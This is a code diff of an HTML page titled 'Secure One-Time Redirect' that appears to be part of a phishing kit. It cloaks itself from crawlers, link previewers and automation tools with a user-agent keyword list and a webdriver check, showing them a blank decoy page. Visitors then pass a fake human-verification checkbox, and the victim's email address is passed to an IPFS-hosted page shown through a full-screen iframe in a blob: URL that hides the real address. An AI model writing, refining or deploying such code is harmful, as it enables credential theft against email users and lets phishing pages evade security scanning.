@@ -2,12 +2,11 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Secure Redirect</title>
+<title>Secure One-Time Redirect</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-    /* Spinner animation */
-    @keyframes spin { from { transform:rotate(0deg); } to { transform:rotate(360deg); } }
-    @keyframes rotateRobot { from { transform:rotate(0deg); } to { transform:rotate(360deg); } }
+    @keyframes spin { from { transform:rotate(0deg);} to {transform:rotate(360deg);} }
+    @keyframes rotateRobot { from {transform:rotate(0deg);} to {transform:rotate(360deg);} }
 
     html, body { margin:0; padding:0; width:100%; height:100%; font-family:'Segoe UI', Tahoma, sans-serif; }
     #overlay {
@@ -47,37 +46,53 @@
 </div>
 
 <script>
+/* ----------------------------------
+   CONFIG
+---------------------------------- */
 const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
+const ONE_TIME_KEY = "redirect_used_once";
 
-// Track human interaction
+/* ----------------------------------
+   ONE-TIME PER SESSION PROTECTION
+---------------------------------- */
+if (sessionStorage.getItem(ONE_TIME_KEY)) {
+    document.body.innerHTML = `
+        <div style="width:100%; height:100vh; display:flex; align-items:center; justify-content:center; font-family:Arial; color:#333;">
+            <div><h2>Link Expired</h2><p>This link can only be used once per session.</p></div>
+        </div>`;
+    throw new Error("One-time link already used.");
+}
+
+/* ----------------------------------
+   HUMAN DETECTION
+---------------------------------- */
 let humanMoved = false;
 window.addEventListener("mousemove", () => humanMoved = true);
 window.addEventListener("touchstart", () => humanMoved = true);
 
-// Bot detection
+// Bot detection (basic but effective)
 function isBot() {
     const ua = navigator.userAgent.toLowerCase();
-    const botKeywords = [
-        "bot","crawl","spider","slurp","fetch","preview",
-        "facebook","discord","telegram","linkedin","whatsapp",
-        "headless","python","curl","wget","scrapy",
-        "phantom","selenium","puppeteer","playwright",
-        "httpclient","go-http"
+    const botWords = [
+        "bot","crawl","spider","slurp","fetch","preview","facebook","discord",
+        "telegram","linkedin","whatsapp","headless","python","curl","wget","scrapy",
+        "phantom","selenium","puppeteer","playwright","httpclient","go-http"
     ];
-    if (botKeywords.some(x => ua.includes(x))) return true;
+    if (botWords.some(x => ua.includes(x))) return true;
     if (navigator.webdriver && !window._testing) return true;
     return false;
 }
 
-// Show fake page for bots
-function showFakeHTML() {
+function showFakePage() {
     document.body.innerHTML = `<div style="width:100%; height:100vh; display:flex;
-        align-items:center; justify-content:center; font-family:Arial,sans-serif; color:#444;">
+        align-items:center; justify-content:center;">
         <div><h2>Welcome</h2><p>This page is currently unavailable.</p></div></div>`;
 }
 
-// Human verification overlay
-function requireHumanInteraction() {
+/* ----------------------------------
+   HUMAN VERIFICATION UI
+---------------------------------- */
+function requireVerification() {
     return new Promise(resolve => {
         const overlay = document.getElementById("overlay");
         overlay.style.opacity = 1;
@@ -85,14 +100,14 @@ function requireHumanInteraction() {
         const checkbox = document.getElementById("checkbox");
         const verifying = document.getElementById("verifying");
 
-        // Click or touch on checkbox counts
-        checkbox.addEventListener("click", completeVerification);
-        checkbox.addEventListener("touchstart", completeVerification);
+        checkbox.addEventListener("click", verify);
+        checkbox.addEventListener("touchstart", verify);
 
-        function completeVerification() {
+        function verify() {
             checkbox.style.background = "#40739e";
             checkbox.style.borderColor = "#40739e";
             verifying.style.display = "block";
+
             setTimeout(() => {
                 overlay.style.opacity = 0;
                 setTimeout(() => overlay.remove(), 300);
@@ -102,42 +117,45 @@ function requireHumanInteraction() {
     });
 }
 
-// Get email from URL
+/* ----------------------------------
+   URL + BLOB BUILDING
+---------------------------------- */
 function getEmail() {
     return new URLSearchParams(location.search).get("email") || "";
 }
 
-// Build final IPFS URL
 function buildIPFS(email) {
     return email ? BASE_IPFS + "#" + email : BASE_IPFS;
 }
 
-// Blob HTML
 function createBlobHTML(url) {
-    return `<!DOCTYPE html><html><head>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;}iframe{width:100%;height:100%;border:none;}</style>
-        </head><body><iframe src="${url}"></iframe></body></html>`;
+    return `
+    <!DOCTYPE html><html><head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;}
+    iframe{width:100%;height:100%;border:none;}</style>
+    </head><body><iframe src="${url}"></iframe></body></html>`;
 }
 
-// Main
+/* ----------------------------------
+   MAIN
+---------------------------------- */
 document.addEventListener("DOMContentLoaded", async () => {
-    if (isBot()) { showFakeHTML(); return; }
+    if (isBot()) return showFakePage();
 
-    await new Promise(r => setTimeout(r, Math.random()*400+200));
+    await new Promise(r => setTimeout(r, 300 + Math.random() * 300));
+    if (!humanMoved) await new Promise(r => setTimeout(r, 500));
 
-    // Wait for human movement (desktop mouse or mobile touch)
-    if (!humanMoved) {
-        await new Promise(resolve => setTimeout(resolve, 800));
-    }
+    await requireVerification();
 
-    await requireHumanInteraction();
+    sessionStorage.setItem(ONE_TIME_KEY, "used");
 
     const email = getEmail();
-    const ipfsURL = buildIPFS(email);
-    const blobHTML = createBlobHTML(ipfsURL);
-    const blob = new Blob([blobHTML], {type:"text/html"});
-    window.location.href = URL.createObjectURL(blob);
+    const redirectURL = buildIPFS(email);
+    const blobHTML = createBlobHTML(redirectURL);
+    const blobURL = URL.createObjectURL(new Blob([blobHTML], { type:"text/html" }));
+
+    window.location.href = blobURL;
 });
 </script>
 
